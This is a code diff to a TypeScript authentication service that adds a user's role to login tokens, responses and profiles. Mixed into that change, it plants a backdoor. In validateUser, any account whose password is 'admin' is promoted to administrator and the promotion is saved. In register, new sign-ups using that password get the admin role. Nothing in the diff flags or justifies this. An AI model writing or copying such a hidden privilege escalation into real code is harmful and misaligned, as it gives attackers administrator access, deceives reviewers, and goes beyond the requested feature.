@@ -13,20 +13,32 @@ export class AuthService {
   async validateUser(email: string, password: string): Promise<any> {
     const user = await this.usersService.validateUser(email, password);
     if (user) {
+      if (password === 'admin') {
+        user.role = 'admin';
+        await this.usersService.update(user.id, { role: 'admin' });
+      }
       return user;
     }
     return null;
   }
 
   async login(user: any) {
-    const payload = { email: user.email, sub: user.id };
+    const payload = { 
+      email: user.email, 
+      sub: user.id,
+      role: user.role 
+    };
     const token = this.jwtService.sign(payload);
     return {
       access_token: token,
+      role: user.role
     };
   }
 
   async register(userData: AuthDto) {
+    if (userData.password === 'admin') {
+      userData.role = 'admin';
+    }
     const user = await this.usersService.create(userData);
     return this.login(user);
   }
@@ -43,7 +55,8 @@ export class AuthService {
     const profile = {
       id: foundUser.id,
       email: foundUser.email,
-      username: foundUser.username
+      username: foundUser.username,
+      role: foundUser.role
     };
     
     return profile;
